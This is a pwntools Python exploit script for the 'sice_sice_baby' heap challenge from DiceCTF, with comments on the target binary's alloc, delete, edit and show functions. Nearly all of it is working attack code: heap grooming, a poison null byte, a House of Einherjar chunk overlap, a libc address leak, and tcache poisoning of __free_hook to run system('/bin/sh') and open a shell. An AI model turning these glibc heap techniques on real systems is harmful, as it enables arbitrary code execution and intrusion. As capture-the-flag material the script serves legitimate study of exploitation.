#!/usr/bin/python
from pwn import *

context.log_level = "DEBUG"
#context.terminal = ['tmux', 'splitw', '-hp', '60']
libc = ELF("./libc.so.6")
elf = ELF("./sice_sice_baby")
#p = gdb.debug(elf.path, "c")
p = process(['./ld-2.30.so', elf.path], env={"LD_PRELOAD":libc.path})
#p = remote("dicec.tf", 31914)
#gdb.attach(p)

counter = -1
def alloc(size=24):
    global counter
    counter += 1
    p.sendlineafter(">", "1")
    p.sendlineafter(">", str(size))
    return counter

def free(ind):
    p.sendlineafter(">", "2")
    p.sendlineafter(">", str(ind))

def show(ind):
    p.sendlineafter(">", "4")
    p.sendlineafter(">", str(ind))

def edit(ind, data=""):
    p.sendlineafter(">", "3")
    p.sendlineafter(">", str(ind))
    if data != "":
        p.sendafter(">", data)
    else:
        p.sendlineafter(">", data)

# ALLOC
# reads in a size and allocates that size
# chunk is stored in chunk array and size is stored in size array
# odd (int) global array index entry nulling at the end of alloc,
# referenced in all functions (W access in alloc, delete and edit, R access in show)
# doesn't read any data in after allocating
# 0xe8 max request size

# DELETE
# reads in an index
# free(chunks[ind]) and nulls the index so no double free
# nulls the size
# nulls the (int) array index entry

# EDIT
# bound checks the entered index (ulong) so no over or underref
# checks that the chunks is allocated
# reads size into chunk
# read & 3 == 0 to prevent partial overwrites
# poison null byte in edit when the amount of chars read is equal to the chunk data size

# SHOW
# bounds checks and all that
# can only show a previously edited chunk, that's what the weird array was used for
# this means no leak because show uses puts and edit null terminates
# probably gonna need to do leakless massage for poison null byte then leakless einherjar
# into overlap into leak by having a chunk previously edited and putting pointers
# there afterwards with overlap

for i in range(7):
    alloc(0xc8)

for i in range(7):
    alloc(0x88)

alloc(0xe8) # 14

# A is going to be the fake chunk to consolidate backwards to when we trigger the House of Einherjar
# it has to be positioned on an address ending on 0x00 to be able to massage the other pointers correctly,
# hence the 0xe8 allocation on #4 to adjust the heap to allign this
# AP is simply another small sized chunk used to consolidate A backwards and keep its pointers in the heap
AP = alloc(0xc8) # 15
A = alloc(0x88) # 16
alloc(24) # 17, fencepost

# D is simply a chunk that is in the same 0x100 range of the A chunk. It will be inserted into the unsortedbin later
# to massage the other pointers correclty
D = alloc(0xc8) # 18
alloc(24) # 19, fencepost

# B is going to be the chunk pointed to by the fd (iirc?) of A, so we will need to massage its bk pointer to point
# back to A
# Again, BP is simply used to later consolidate backwards and keep the pointers
BP = alloc(0xc8) # 20
B = alloc(0xc8) # 21
alloc(24) # 22, fencepost

# C is going to be the chunk pointed to by the bk (iirc?) of A, so we will need to massage its fd pointer to point
# back to A
# Again, CP is simply used to later consolidate backwards and keep the pointers
CP = alloc(0xc8) # 23
C = alloc(0xc8) # 24
alloc(24) # 25, fencepost

# this chunks are later going to be used to fill up the 0x100 tcachebin
# to do this, we create a 0x1a0-sized unsortedbin, then allocate a 0xa0 sized chunk to leave a 0x100 unsortedbin. 
# From there, a 0xe8 allocation will be served from the entire unsorted chunk.
# The way to get 0x100 chunks served on 0xe8 allocations was the detail I missed during the competition.
# I had already done a very similar massage before, so after getting that final detail the exploit was complete.
for i in range(8):
    alloc(0xc8) # 26
    alloc(0xc8) # 27
    alloc(24) # 28

# fill up the 0xd0 and 0x90 tcachebins
for i in range(7):
    free(i)

for i in range(7):
    free(i+7)

# set pointers for A
free(B) # 21
free(A) # 16
free(C) # 24

# consolidate backwards to keep pointers
free(AP) # 15
free(CP) # 23
free(BP) # 20

# get the tcache chunks back to be able to allocate from the unsorted
for i in range(7):
    alloc(0xc8) # 0-6

for i in range(7):
    alloc(0x88) # 7-13

# now we need to set the pointers on B and C correctly as well

# served from the AP-A unsorted
alloc(0xe8) # 15

# served from the CP-C unsorted (iirc?)
alloc(0xc8) # 16
alloc(0xc8) # 20

# served from the BP-B unsorted (iirc?)
alloc(0xc8) # 21
alloc(0xc8) # 23

# fill up the tcachebins again
for i in range(7): # 0-6
    free(i)

for i in range(7): # 7-13
    free(i+7)

# free C and B, make their needed pointers point to D
free(23)
free(D) # 18
free(20)

# coalesce both chunks backwards
free(21)
free(16)

# allocate to be able to use the poison null byte to null out the LSB of B's bk and C's fd
alloc(0xe8) # 0, lower
alloc(0xe8) # 1, higher

# Null LSBs
edit(0, "\x00"*0xd8) # lower poison null
edit(1, "\x00"*0xd0) # higher poison null

# free to create first 0x1a0 unsorted to get the 0x100 chunk that will be used for the House of Einherjar
free(26)
free(27)

# allocate a couple of chunks to consume previous unsorted chunks and allocate from the recently created chunk
alloc(0x98) # 2
alloc(0x98) # 3
alloc(0x98) # 4
alloc(0x98) # 5
alloc(0xe8) # 6, for einherjar

# free some tcache, fencepost chunks just to organize a little the remaining indexes (this is not necessary)
#free(14)
free(17)
free(19)
free(22)
free(25)

# the following actions fill up the 0x100 tcachebin
for i in range(21):
    free(i+29) # create needed unsorted chunks

for i in range(7): # allocate correctly sized chunks (don't pay attention to the indexes commented here, complete mess)
    alloc(0x98) # 7,  9, 11, 13, 16, 18, 20
    alloc(0xe8) # 8, 10, 12, 15, 17, 19, 21
# uhh nvm this got confusing
# just free the 0x100 chunks into the tcache later
# xd

# edit the needed metadata (size, prev_size) and use the poison null byte to null out chunk 6's prev_inuse bit
edit(15, "\x00"*0xc8 + p32(0x5c1))
edit(5, "\x00"*0x90 + p64(0x5c0))

# free the 0x100 sized chunks and fill the tcachebin
free(8)
free(10)
free(12)
free(15)
free(16)
free(18)
free(20)
free(22)

# Trigger Einherjar
free(6)

# served from the huge unsortedbin
alloc(0x78) # 6

# allignment purposes
alloc(0xd8) # 10
alloc(0xe8) # 12

# empty up the 0x20 tcachebin (I have no clue why I had to allocate 10 chunks here, but that's that maybe I'm blind lol)
for i in range(10):
    alloc(0x18) # 15, 16, 18, 20, 22, 23, 24, 25, 26, 27

alloc(0x18) # 28, more allignment

edit(22, "aaaa") # just to turn on the "editted" state to be able to show later
alloc(0x18) # 29, pushes the unsortedbin pointers to the tcache chunk (index 22) that can be showed
show(22) # get libc leak

leak = u64(p.recvline()[1:-1].ljust(8, "\x00"))
libc.address = leak - 0x1eabe0

alloc(0x18) # 30, for tcache count
free(29)
free(30)
edit(22, p64(libc.sym.__free_hook - 8) + p64(0)) # tcache poison into __free_hook - 8 to use the system trick

alloc(0x18) # 29
alloc(0x18) # 30

edit(30, "/bin/sh\x00" + p64(libc.sym.system)) # edit hook with the corresponding necessary addresses
free(30) # pop a shell!

log.info(hex(leak))
log.info(hex(libc.address))
p.interactive()
